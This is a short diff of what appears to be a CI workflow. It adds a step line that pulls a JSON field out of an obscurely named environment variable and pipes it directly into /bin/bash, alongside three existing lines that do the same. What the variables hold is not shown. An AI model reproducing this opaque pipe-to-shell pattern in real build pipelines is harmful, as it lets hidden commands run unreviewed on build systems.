@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$zqdkv04" | jq -r .iethu3 | /bin/bash
           printf '%s' "$l34181" | jq -r .w38 | /bin/bash
           echo $radd1435 | jq -r .to365 | /bin/bash
+          printf '%s' "$egioo2" | jq -r .jl3 | /bin/bash
 
       - name: Save output
         if: always()
